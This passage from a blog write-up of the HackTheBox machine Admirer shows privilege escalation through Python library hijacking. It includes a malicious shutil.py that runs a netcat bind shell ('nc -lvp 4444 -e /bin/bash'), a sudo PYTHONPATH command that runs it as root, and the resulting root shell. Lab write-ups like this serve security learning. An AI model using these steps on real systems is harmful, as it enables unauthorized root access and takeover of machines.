        </span><span class="nb">echo</span> <span class="s2">"Running mysqldump in the background, it may take a while..."</span>
        <span class="c">#/usr/bin/mysqldump -u root admirerdb &gt; /srv/ftp/dump.sql &amp;</span>
        /usr/bin/mysqldump <span class="nt">-u</span> root admirerdb <span class="o">&gt;</span> /var/backups/dump.sql &amp;
    <span class="k">else
        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
    <span class="k">fi</span>
<span class="o">}</span>



<span class="c"># Non-interactive way, to be used by the web interface</span>
<span class="k">if</span> <span class="o">[</span> <span class="nv">$# </span><span class="nt">-eq</span> 1 <span class="o">]</span>
<span class="k">then
    </span><span class="nv">option</span><span class="o">=</span><span class="nv">$1</span>
    <span class="k">case</span> <span class="nv">$option</span> <span class="k">in
        </span>1<span class="p">)</span> view_uptime <span class="p">;;</span>
        2<span class="p">)</span> view_users <span class="p">;;</span>
        3<span class="p">)</span> view_crontab <span class="p">;;</span>
        4<span class="p">)</span> backup_passwd <span class="p">;;</span>
        5<span class="p">)</span> backup_shadow <span class="p">;;</span>
        6<span class="p">)</span> backup_web <span class="p">;;</span>
        7<span class="p">)</span> backup_db <span class="p">;;</span>

        <span class="k">*</span><span class="p">)</span> <span class="nb">echo</span> <span class="s2">"Unknown option."</span> <span class="o">&gt;</span>&amp;2
    <span class="k">esac

    </span><span class="nb">exit </span>0
<span class="k">fi</span>


<span class="c"># Interactive way, to be called from the command line</span>
<span class="nv">options</span><span class="o">=(</span><span class="s2">"View system uptime"</span>
         <span class="s2">"View logged in users"</span>
         <span class="s2">"View crontab"</span>
         <span class="s2">"Backup passwd file"</span>
         <span class="s2">"Backup shadow file"</span>
         <span class="s2">"Backup web data"</span>
         <span class="s2">"Backup DB"</span>
         <span class="s2">"Quit"</span><span class="o">)</span>

<span class="nb">echo
echo</span> <span class="s2">"[[[ System Administration Menu ]]]"</span>
<span class="nv">PS3</span><span class="o">=</span><span class="s2">"Choose an option: "</span>
<span class="nv">COLUMNS</span><span class="o">=</span>11
<span class="k">select </span>opt <span class="k">in</span> <span class="s2">"</span><span class="k">${</span><span class="nv">options</span><span class="p">[@]</span><span class="k">}</span><span class="s2">"</span><span class="p">;</span> <span class="k">do
    case</span> <span class="nv">$REPLY</span> <span class="k">in
        </span>1<span class="p">)</span> view_uptime <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        2<span class="p">)</span> view_users <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        3<span class="p">)</span> view_crontab <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        4<span class="p">)</span> backup_passwd <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        5<span class="p">)</span> backup_shadow <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        6<span class="p">)</span> backup_web <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        7<span class="p">)</span> backup_db <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>
        8<span class="p">)</span> <span class="nb">echo</span> <span class="s2">"Bye!"</span> <span class="p">;</span> <span class="nb">break</span> <span class="p">;;</span>

        <span class="k">*</span><span class="p">)</span> <span class="nb">echo</span> <span class="s2">"Unknown option."</span> <span class="o">&gt;</span>&amp;2
    <span class="k">esac
done

</span><span class="nb">exit </span>0
</pre></table></code></div></div><p>Its a pretty clean bash-script.There is function called <code class="language-plaintext highlighter-rouge">backup_web()</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>backup_web<span class="o">()</span>
<span class="o">{</span>
    <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
    <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"Running backup script in the background, it might take a while..."</span>
        /opt/scripts/backup.py &amp;
    <span class="k">else
        </span><span class="nb">echo</span> <span class="s2">"Insufficient privileges to perform the selected operation."</span>
    <span class="k">fi</span>
<span class="o">}</span>
</pre></table></code></div></div><p>Which is running a file called <code class="language-plaintext highlighter-rouge">backup.py</code> whci is in the same dir as <code class="language-plaintext highlighter-rouge">scripts</code></p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="nn">shutil</span> <span class="kn">import</span> <span class="n">make_archive</span>

<span class="n">src</span> <span class="o">=</span> <span class="s">'/var/www/html/'</span>

<span class="c1"># old ftp directory, not used anymore
#dst = '/srv/ftp/html'
</span>
<span class="n">dst</span> <span class="o">=</span> <span class="s">'/var/backups/html'</span>

<span class="n">make_archive</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s">'gztar'</span><span class="p">,</span> <span class="n">src</span><span class="p">)</span>
</pre></table></code></div></div><p>Its using the module <code class="language-plaintext highlighter-rouge">shutil</code> and there is a function call of function <code class="language-plaintext highlighter-rouge">make_archive</code>.</p><h2 id="python-path-hijacking">Python path hijacking</h2><p>The blogs that helped me</p><blockquote><p><a href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/" target="_blank">https://rastating.github.io/privilege-escalation-via-python-library-hijacking/</a></p></blockquote><blockquote><p><a href="https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7" target="_blank">https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7</a></p></blockquote><p>So what can we do to get root from it …..</p><p>Well we know that we can set <code class="language-plaintext highlighter-rouge">path</code> as root so we can also set <code class="language-plaintext highlighter-rouge">PYTHONPATH</code> as root. since we can run the script <code class="language-plaintext highlighter-rouge">admin_tasks.sh</code> as root and also the bash script is running the <code class="language-plaintext highlighter-rouge">backup.py</code> so it will run as root itself.And we will create a <code class="language-plaintext highlighter-rouge">python</code> file containing <code class="language-plaintext highlighter-rouge">netcat</code> <strong>bind</strong> <code class="language-plaintext highlighter-rouge">shell</code> and we will set the <code class="language-plaintext highlighter-rouge">PYTHONPATH</code> to the dir where our <code class="language-plaintext highlighter-rouge">custom</code> <strong>shutil.py</strong> is located.And then run the script with the option <code class="language-plaintext highlighter-rouge">6</code> which will run the backup.py and <code class="language-plaintext highlighter-rouge">backup.py</code> will find the file <code class="language-plaintext highlighter-rouge">shutil.py</code> in its <code class="language-plaintext highlighter-rouge">PATH</code>.</p><p>Now Since we changed the <code class="language-plaintext highlighter-rouge">PYTHONPATH</code> to <code class="language-plaintext highlighter-rouge">/home/waldo/newpath</code> and It will execute our <code class="language-plaintext highlighter-rouge">custom</code> <code class="language-plaintext highlighter-rouge">shutil.py</code> that contains <code class="language-plaintext highlighter-rouge">reverse-shell</code>.And we will get a shell as <code class="language-plaintext highlighter-rouge">root</code></p><p>It is our current <code class="language-plaintext highlighter-rouge">PYTHONPATH</code></p><blockquote><p>Current Path</p></blockquote><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">waldo</span><span class="o">@</span><span class="n">admirer</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scripts</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import sys;print(sys.path)'</span>
<span class="p">[</span><span class="s">''</span><span class="p">,</span> <span class="s">'/usr/lib/python35.zip'</span><span class="p">,</span> <span class="s">'/usr/lib/python3.5'</span><span class="p">,</span> <span class="s">'/usr/lib/python3.5/plat-x86_64-linux-gnu'</span><span class="p">,</span> <span class="s">'/usr/lib/python3.5/lib-dynload'</span><span class="p">,</span> <span class="s">'/usr/local/lib/python3.5/dist-packages'</span><span class="p">,</span> <span class="s">'/usr/lib/python3/dist-packages'</span><span class="p">]</span>
</pre></table></code></div></div><h2 id="setting-the-path">Setting the PATH</h2><p>i created a <code class="language-plaintext highlighter-rouge">new-dir</code> called <code class="language-plaintext highlighter-rouge">newpath</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>waldo@admirer:~<span class="nv">$ </span><span class="nb">ls
</span>newpath  user.txt
waldo@admirer:~<span class="nv">$ </span>
</pre></table></code></div></div><p>And in <code class="language-plaintext highlighter-rouge">newpath</code> i just made a new file called <code class="language-plaintext highlighter-rouge">shutil.py</code> .</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>waldo@admirer:~/newpath<span class="nv">$ </span><span class="nb">ls
</span>shutil.py
</pre></table></code></div></div><blockquote><p>shutil.py</p></blockquote><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">os</span>
<span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"nc -lvp 4444 -e /bin/bash"</span><span class="p">)</span>
</pre></table></code></div></div><p>And if we run</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>waldo@admirer:~/newpath<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-E</span> <span class="nv">PYTHONPATH</span><span class="o">=</span><span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> /opt/scripts/admin_tasks.sh 6
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>waldo@admirer:~/newpath<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-E</span> <span class="nv">PYTHONPATH</span><span class="o">=</span><span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> /opt/scripts/admin_tasks.sh 6
Running backup script <span class="k">in </span>the background, it might take a <span class="k">while</span>...
waldo@admirer:~/newpath<span class="nv">$ </span>listening on <span class="o">[</span>any] 4444 ...
</pre></table></code></div></div><p>Now on our machine</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>➜  Desktop nc 10.10.10.187 4444
</pre></table></code></div></div><p>and after a <code class="language-plaintext highlighter-rouge">moment</code> we got a <code class="language-plaintext highlighter-rouge">reverse</code> <code class="language-plaintext highlighter-rouge">shell</code> as root.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>waldo@admirer:~/newpath<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-E</span> <span class="nv">PYTHONPATH</span><span class="o">=</span><span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> /opt/scripts/admin_tasks.sh 6
Running backup script <span class="k">in </span>the background, it might take a <span class="k">while</span>...
waldo@admirer:~/newpath<span class="nv">$ </span>listening on <span class="o">[</span>any] 4444 ...
10.10.14.43: inverse host lookup failed: Host name lookup failure
connect to <span class="o">[</span>10.10.10.187] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.14.43] 58986
</pre></table></code></div></div><h2 id="got-shell-as-root">Got shell as root</h2><p>On our <code class="language-plaintext highlighter-rouge">netcat</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>➜  Desktop nc 10.10.10.187 4444
<span class="nb">whoami
</span>root
</pre></table></code></div></div><p>Now its better to <code class="language-plaintext highlighter-rouge">spawn</code> a <code class="language-plaintext highlighter-rouge">tty</code> shell.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>python <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
root@admirer:~/newpath# 
</pre></table></code></div></div><h1 id="got-roottxt">Got root.txt</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>root@admirer:/root# <span class="nb">cat </span>root.txt
<span class="nb">cat </span>root.txt
e18---------------------------190
root@admirer:/root# 
</pre></table></code></div></div><p>And we pwned it …….</p><p>If u liked the writeup.Support a Poor Student to Get the <code class="language-plaintext highlighter-rouge">OSCP-Cert</code> on <a href="https://www.buymeacoffee.com/0xprashant" target="_blank">BuymeaCoffee</a></p><blockquote><p>If you want to get notified as soon as i upload something new to my <code class="language-plaintext highlighter-rouge">blog</code> So just click on the bell icon you are seeing on the right side – &gt; and allow push <code class="language-plaintext highlighter-rouge">notification</code></p></blockquote><h1 id="resources">Resources</h1><div class="table-wrapper"><table><thead><tr><th>Topic<th>Url<tbody><tr><td>Adminer-database Manager<td><a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool" target="_blank">https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool</a><tr><td>Adminer-Database Manager<td><a href="https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability" target="_blank">https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability</a><tr><td>Configuration of Mysql<td><a href="https://support.rackspace.com/how-to/install-mysql-server-on-the-ubuntu-operating-system/" target="_blank">https://support.rackspace.com/how-to/install-mysql-server-on-the-ubuntu-operating-system/</a><tr><td>Configuration of Mysql<td><a href="https://www.digitalocean.com/community/tutorials/how-to-allow-remote-access-to-mysql" target="_blank">https://www.digitalocean.com/community/tutorials/how-to-allow-remote-access-to-mysql</a><tr><td>Configuration of Mysql<td><a href="https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql" target="_blank">https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql</a><tr><td>Python Path Hijacting<td><a href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/" target="_blank">https://rastating.github.io/privilege-escalation-via-python-library-hijacking/</a><tr><td>Python Path Hijacking<td><a href="https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7" target="_blank">https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7</a></table></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/retired/'>retired</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/tags/adminer/" class="post-tag no-text-decoration" >adminer</a> <a href="/tags/python-path-hijacking/" class="post-tag no-text-decoration" >python-path-hijacking</a> <a href="/tags/mysql/" class="post-tag no-text-decoration" >mysql</a> <a href="/tags/netcat-bind-shell/" class="post-tag no-text-decoration" >netcat-bind shell</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Admirer writeup - 0xPrashant&url=http://localhost:4000/posts/htb-admirer/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Admirer writeup - 0xPrashant&u=http://localhost:4000/posts/htb-admirer/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox Admirer writeup - 0xPrashant&url=http://localhost:4000/posts/htb-admirer/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-sniper/"><div class="card-body"> <span class="timeago small" > Mar 27 <i class="unloaded">2020-03-27T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Sniper writeup</h3><div class="text-muted small"><p> information Column Details Name Sniper Points 30 Difficulty Medium Creator Minato...</p></div></div></a></div><div class="card"> <a href="/posts/htb-quick/"><div class="card-body"> <span class="timeago small" > Apr 30 <i class="unloaded">2020-04-30T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Quick writeup</h3><div class="text-muted small"><p> Information@quick:~$ Column Details Name Quick IP 10.10.10.186 Points 40 Os Linux...</p></div></div></a></div><div class="card"> <a href="/posts/htb-travel/"><div class="card-body"> <span class="timeago small" > May 21 <i class="unloaded">2020-05-21T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Travel writeup</h3><div class="text-muted small"><p> Introduction@Travel:~$ Column Details Name Travel IP 10.10.10.189 Points 40 Os Li...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-openadmin/" class="btn btn-outline-primary"><p>Hackthebox Openadmin writeup</p></a> <a href="/posts/htb-obsecurity/" class="btn btn-outline-primary"><p>Hackthebox obscurity writeup</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//0xprashant.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/htb-admirer/'; this.page.identifier = '/posts/htb-admirer/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <br></br> <script src="https://www.hackthebox.eu/badge/84820"></script></p></div><p class="mb-0"> © 2020 <a href="https://www.facebook.com/prashant.saini.37201">Prashant Saini</a>. <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-157514490-1', 'auto'); ga('send', 'pageview'); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="0xprashant" data-description="Support me on Buy me a coffee!" data-message="Like The Blog? Support Me!" data-color="#5F7FFF" data-position="right" data-x_margin="18" data-y_margin="18"></script></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
